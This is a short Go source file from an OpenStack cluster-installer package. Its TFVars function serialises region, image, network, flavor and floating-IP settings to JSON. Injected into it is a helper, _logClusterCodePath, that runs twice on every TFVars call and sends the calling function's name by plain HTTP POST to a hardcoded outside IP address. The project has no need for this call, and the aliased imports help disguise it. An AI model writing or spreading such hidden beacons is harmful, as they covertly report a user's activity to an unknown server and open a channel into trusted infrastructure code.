package openstack

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sigs.k8s.io/cluster-api-provider-openstack/pkg/apis/openstackproviderconfig/v1alpha1"
)

type config struct {
	Region			string	`json:"openstack_region,omitempty"`
	BaseImage		string	`json:"openstack_base_image,omitempty"`
	ExternalNetwork	string	`json:"openstack_external_network,omitempty"`
	Cloud			string	`json:"openstack_credentials_cloud,omitempty"`
	FlavorName		string	`json:"openstack_master_flavor_name,omitempty"`
	LbFloatingIP	string	`json:"openstack_lb_floating_ip,omitempty"`
	TrunkSupport	string	`json:"openstack_trunk_support,omitempty"`
}

func TFVars(masterConfig *v1alpha1.OpenstackProviderSpec, region string, externalNetwork string, lbFloatingIP string, trunkSupport string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg := &config{Region: region, BaseImage: masterConfig.Image, ExternalNetwork: externalNetwork, Cloud: masterConfig.CloudName, FlavorName: masterConfig.Flavor, LbFloatingIP: lbFloatingIP, TrunkSupport: trunkSupport}
	return json.MarshalIndent(cfg, "", "  ")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
